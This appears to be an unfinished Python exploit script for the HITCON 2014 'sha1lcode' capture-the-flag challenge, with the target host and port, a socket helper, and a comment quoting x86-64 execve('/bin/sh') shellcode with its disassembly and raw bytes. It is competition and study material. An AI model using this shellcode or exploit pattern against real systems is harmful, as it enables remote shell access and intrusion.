__author__ = 'HuyNA'
"""
Description
Pwn this and cat the flag.

nc 210.61.2.51 5566
https://raw.githubusercontent.com/hitcon2014ctf/ctf/master/sha1lcode-5b43cc13b0fb249726e0ae175dbef3fe
https://dl.dropbox.com/s/gkng3jqe94sdrxy/sha1lcode-5b43cc13b0fb249726e0ae175dbef3fe

"""

import sys
import os
import socket
import time
import telnetlib
import struct

def recv_until(sock, delim):
    buf = ""
    while True:
        c = sock.recv(1)
        buf += c
        if delim in buf:
            break
    return buf
# nc 210.61.8.96 51342
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
local_host="210.61.2.51"
#local_host='192.168.248.176'
local_port = 5566

'''
http://shell-storm.org/shellcode/files/shellcode-806.php

000000007763CB71 | 48 31 D2                 | xor rdx,rdx                             |
000000007763CB74 | 31 C0                    | xor eax,eax                             |
000000007763CB76 | 48 BB D1 9D 96 91 D0 8C  | mov rbx,FF978CD091969DD1                |
000000007763CB80 | 48 F7 DB                 | neg rbx                                 |
000000007763CB83 | 53                       | push rbx                                |
000000007763CB84 | 54                       | push rsp                                |
000000007763CB85 | 5F                       | pop rdi                                 |
000000007763CB86 | 99                       | cdq                                     |
000000007763CB87 | 52                       | push rdx                                |
000000007763CB88 | 57                       | push rdi                                |
000000007763CB89 | 54                       | push rsp                                |
000000007763CB8A | 5E                       | pop rsi                                 |
000000007763CB8B | B0 3B                    | mov al,3B                               |
000000007763CB8D | 0F 05                    | syscall                                 |

\x48\x31\xd2\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48
\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05
'''